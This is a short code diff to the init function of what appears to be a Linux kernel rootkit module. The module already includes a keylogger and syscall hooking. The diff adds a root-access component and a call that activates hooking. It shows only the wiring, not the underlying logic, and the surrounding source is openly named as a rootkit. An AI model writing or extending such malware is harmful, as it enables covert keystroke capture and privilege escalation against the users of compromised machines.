@@ -8,6 +8,7 @@
 #include "keylogger.h"
 #include "etc.h"
 #include "hooking.h"
+#include "root_access.h"
 
 // module documentation
 MODULE_LICENSE(DRIVER_LICENSE);
@@ -23,6 +24,9 @@ static int __init rootkit_init(void) {
 	init_hooking();
 	init_fops();
 	init_keylogger();
+	init_root_access();
+
+	hook();
 	printk(KERN_INFO "[+] Module loaded, inside %s.\n", __FUNCTION__);
 	return 0;
 }
